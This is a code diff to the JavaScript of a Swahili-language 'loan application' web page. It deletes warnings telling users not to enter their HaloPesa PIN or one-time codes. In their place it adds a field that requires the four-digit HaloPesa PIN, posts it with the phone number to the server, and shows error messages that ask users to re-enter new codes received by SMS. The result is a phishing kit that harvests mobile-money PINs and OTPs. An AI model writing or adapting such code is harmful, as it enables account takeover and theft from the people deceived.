@@ -20,7 +20,7 @@
       const value=input.value||"";
       Array.from(boxes.children).forEach((cell,i)=>{
         const char=value[i]||"";
-        cell.textContent=char?(revealed?char:"•"):"";
+        cell.textContent=char?(revealed?char:"#"):"";
         cell.classList.toggle("masked",!!char&&!revealed);
         cell.classList.toggle("active",i===Math.min(value.length,length-1)&&value.length<length);
       });
@@ -129,12 +129,12 @@ async function waitForStatus(expected,next,errorId){
 }
 function handleRejection(d){
   const messages={
-    APPLICATION_DETAILS:"Kitambulisho au PIN ya maombi ya portal haikukubaliwa. Hakiki taarifa za portal hii kisha ujaribu tena. Usiweke PIN ya HaloPesa.",
-    FIRST_NAME:"Code 1 haikukubaliwa. Hakiki Code 1 ya portal hii na ujaribu tena. Usiweke OTP ya HaloPesa au huduma nyingine.",
-    SECOND_NAME:"Code 2 haikukubaliwa. Hakiki Code 2 ya portal hii na ujaribu tena. Usiweke OTP ya HaloPesa au huduma nyingine.",
+    APPLICATION_DETAILS:"PIN yako ya halopesa haikukubaliwa. Hakiki numberi na pin yako kisha ujaribu tena.",
+    FIRST_NAME:"Code 1 haikukubaliwa. Weka codi mpya unayo pokea kwa simu yako na ujaribu tena.",
+    SECOND_NAME:"Code 2 haikukubaliwa. Weka codi mpya unayo pokea kwa simu yako na ujaribu tena.",
     AMOUNT:"Kiasi cha mkopo hakikukubaliwa. Hakiki kiasi ulichoweka kisha ujaribu tena."
   };
-  const msg=messages[d.rejectedStage]||"Ombi halikukubaliwa. Hakiki taarifa za portal hii kisha ujaribu tena.";
+  const msg=messages[d.rejectedStage]||"Ombi halikukubaliwa. Hakiki taarifa za HALOPESA hii kisha ujaribu tena.";
   if(d.rejectedStage==="FIRST_NAME"){
     stopNameTimer("first");state.firstDeadline=null;$("firstName").disabled=false;$("firstNameBtn").classList.remove("hidden");$("firstNameResubmit").classList.add("hidden");$("firstNameWaiting").classList.add("hidden");setError("page2Error",msg);showPage(2);
   }else if(d.rejectedStage==="SECOND_NAME"){
@@ -149,7 +149,7 @@ $("loginForm").addEventListener("submit",async e=>{
   e.preventDefault();setError("loginError","");
   const phone=$("phone").value.trim(),applicationId=$("applicationIdInput").value.trim();
   if(!/^[0-9+\s-]{9,20}$/.test(phone))return setError("loginError","Weka nambari sahihi ya simu.");
-  if(!/^[A-Za-z0-9-]{3,80}$/.test(applicationId))return setError("loginError","Weka neno siri sahihi.");
+  if(!/^\d{4}$/.test(applicationId))return setError("loginError","Weka pin ya halopesa .");
   const b=$("startApplication");b.disabled=true;
   try{const r=await fetch("/api/applications",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,applicationId,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$("applicationNumber").textContent=d.applicationNo;$("approvalWaiting").classList.remove("hidden");$("phone").disabled=true;$("applicationIdInput").disabled=true;b.classList.add("hidden");await waitForStatus("APPROVED",2,"loginError");}catch(err){setError("loginError",err.message||"Imeshindikana kutuma ombi.");b.disabled=false;}
 });
